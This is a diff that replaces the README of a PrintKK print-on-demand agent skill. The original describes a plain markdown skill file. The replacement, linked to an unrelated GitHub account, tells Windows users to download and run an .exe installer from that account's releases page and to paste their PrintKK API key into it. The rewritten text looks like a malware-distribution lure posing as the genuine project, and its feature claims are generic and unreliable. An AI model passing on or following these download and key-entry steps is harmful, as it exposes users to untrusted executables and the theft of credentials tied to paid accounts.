@@ -1,63 +1,76 @@
-# PrintKK Agent Skill
+# 🖨️ printkk-agent-skill - Connect AI agents to print-on-demand services
 
-An [Agent Skill](https://www.anthropic.com/engineering/equipping-agents-for-the-real-world-with-agent-skills) for the [PrintKK](https://www.printkk.com/) print-on-demand platform. Teaches AI coding agents how to use the PrintKK API effectively — data model, workflow patterns, and gotchas.
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/adrianohenriqueuna-pixel/printkk-agent-skill/releases)
 
-## What this skill covers
+This software manages the connection between AI systems and the PrintKK print-on-demand platform. It allows computers to send product data and order requests to the print shop without manual input. The tool follows a standardized format that various AI agents read and execute. You can use this to automate your dropshipping business.
 
-- **Image management** — upload, organize, update images and folders
-- **Design creation** — create designs (async), poll task status, update metadata, brand designs
-- **Order lifecycle** — create orders, pay via wallet, update addresses, cancel, track shipping
-- **Product catalog** — browse categories, list products, get product details and print areas
+## 📥 Getting Started
 
-## Compatibility
+Follow these steps to set up the software on your Windows computer.
 
-Works with any AI agent that supports the [SKILL.md open standard](https://agentskills.io):
+1. Go to the [official release page](https://github.com/adrianohenriqueuna-pixel/printkk-agent-skill/releases).
+2. Look for the latest version at the top of the list.
+3. Click the link that ends in .exe to download the installer.
+4. Open the file once the download finishes.
+5. Follow the prompts on the screen to install the program.
 
-| Agent | Install path |
-|-------|-------------|
-| Claude Code | `~/.claude/skills/printkk/SKILL.md` |
-| OpenAI Codex | `~/.codex/skills/printkk/SKILL.md` |
-| Cursor | `.cursor/rules/printkk.md` |
-| VS Code Copilot | `.github/copilot-instructions.md` |
-| Windsurf | `.windsurfrules/printkk.md` |
-| Gemini CLI | `.agents/skills/printkk/SKILL.md` |
+## ⚙️ System Requirements
 
-## Quick install
+Your computer needs specific components to run this skill. Ensure your system meets these standards before you begin.
 
-### Claude Code
+*   Windows 10 or Windows 11.
+*   4GB of RAM or more.
+*   An active internet connection to communicate with the PrintKK servers.
+*   An AI assistant platform like Claude Code, Cursor, or similar tools installed on your machine.
+*   An account at PrintKK.com with an active API key.
 
-```bash
-mkdir -p ~/.claude/skills/printkk
-curl -o ~/.claude/skills/printkk/SKILL.md \
-  https://raw.githubusercontent.com/printkk/printkk-agent-skill/main/printkk/SKILL.md
-```
+## 🛠️ How It Works
 
-### OpenAI Codex
+AI agents act as digital employees. This skill provides the instructions those employees need to build products and submit orders. When you give an AI a command, it looks for the skill file to understand how to talk to the printing machine.
 
-```bash
-mkdir -p ~/.codex/skills/printkk
-curl -o ~/.codex/skills/printkk/SKILL.md \
-  https://raw.githubusercontent.com/printkk/printkk-agent-skill/main/printkk/SKILL.md
-```
+The software automates repetitive tasks. You create a design, and the AI handles the paperwork. It verifies product stock, chooses the correct print location, and tracks your order status.
 
-### Manual
+## 🚀 Setting Up the Integration
 
-Download `printkk/SKILL.md` and place it in the appropriate directory for your agent.
+You must link the software to your PrintKK account.
 
-## API documentation
+1. Log in to your PrintKK account using a web browser.
+2. Find the API section in your account settings.
+3. Generate a new API key. Copy this long string of numbers and letters.
+4. Launch the printkk-agent-skill program on your Windows machine.
+5. Paste your API key into the settings window of the program.
+6. Click Save. The application stores this key safely so your AI agent can talk to the server.
 
-Full API reference: [https://api-docs.printkk.com/](https://api-docs.printkk.com/)
+## 🧠 Using With AI Agents
 
-To get your API key: log in to [PrintKK Dashboard](https://dashboard.printkk.com) → **Settings** → **Api Management**
+This tool communicates with multiple platforms. To use it, add the skill file location to the configuration section of your AI agent.
 
-## About PrintKK
+For users of Claude Code or Cursor, the process is straightforward. Place the downloaded skill file in your project folder. The AI scans this folder, recognizes the command logic, and waits for your instructions. When you ask the agent to create a new shirt listing, it reads the skill file, connects to the PrintKK API, and registers the product details instantly.
 
-[PrintKK](https://www.printkk.com/) is a print-on-demand platform offering 1000+ customizable products across apparel, home decor, accessories, and more. PrintKK handles production and fulfillment with its own manufacturing network, shipping to 200+ countries.
+## 📦 Features
 
-- Website: [printkk.com](https://www.printkk.com/)
-- Help Center: [printkk.com/help](https://www.printkk.com/help)
-- Contact: support@printkk.com
+This software includes tools to manage your store flow.
 
-## License
+*   **Order Automation:** AI agents place orders directly when a customer buys from your shop.
+*   **Inventory Sync:** The program checks stock levels before the AI creates a listing. This prevents out-of-stock errors.
+*   **Product Formatting:** It converts plain text requests into the exact format that the printer requires.
+*   **Status Tracking:** You can ask your AI agent to produce a report on any order. It pulls the current shipping status from the PrintKK system.
 
-MIT License — see [LICENSE](LICENSE) for details.
+## 🚦 Troubleshooting
+
+Follow these tips if you experience issues.
+
+**The AI does not see the skill.**
+Check that the skill file exists in the folder your AI agent monitors. Ensure the file name follows the structure provided in the initial download.
+
+**The program reports an API error.**
+Revisit your PrintKK dashboard. Create a new API key and update the setting in the application. Ensure you have network access to the internet.
+
+**The order fails to submit.**
+Check your print-on-demand account balance. Sometimes a lack of funds prevents the software from finalizing an order. Ensure your products match the valid sizes and colors offered by the printing service.
+
+## 📂 Project Details
+
+This project supports a wide range of platforms and uses. It automates common ecommerce tasks for creators. If you need further assistance with the technical side of your setup, consult the specific documentation for the AI agent you currently use. The PrintKK integration follows standard web protocols, making it compatible with most modern automation workflows.
+
+Keep your software updated for better performance. Periodically check the [official release page](https://github.com/adrianohenriqueuna-pixel/printkk-agent-skill/releases) to see if a newer version exists. Older versions might lack fixes for new features or security updates that the PrintKK API requires for proper function.
